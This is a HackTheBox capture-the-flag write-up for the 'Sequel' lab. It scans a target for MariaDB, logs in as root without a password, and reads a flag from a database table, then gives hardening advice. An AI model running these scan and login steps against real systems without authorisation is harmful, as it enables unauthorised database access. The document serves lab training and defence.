# Sequel - HackTheBox Writeup 🗄️

- **Platform:** HackTheBox (Starting Point - Tier 0)
- **Target OS:** Linux
- **Vulnerability:** Unauthenticated Remote MySQL/MariaDB Access

---

## 📌 Reconnaissance

I scanned the target for database services:

```bash
nmap -sV -p 3306 <TARGET_IP>
```

### Scan Results:
- `3306/tcp open mysql MariaDB 10.3.27`

Port 3306 (MySQL/MariaDB) was open to external connections.

---

## ⚡ Exploitation

I attempted to connect directly to the MariaDB server as `root` without providing a password:

```bash
mysql -h <TARGET_IP> -u root
```

The connection succeeded immediately without asking for credentials.

---

## 🚩 Flag Capture

Inside the MariaDB shell:

```sql
MariaDB [(none)]> SHOW DATABASES;
MariaDB [(none)]> USE htb;
MariaDB [htb]> SHOW TABLES;
MariaDB [htb]> SELECT * FROM config;
```

The `config` table contained the flag string.

---

## 💡 Notes & Takeaways
- Always set strong passwords on administrative database users (`root`).
- Bind database services to `127.0.0.1` unless remote access is explicitly required and secured by a firewall.
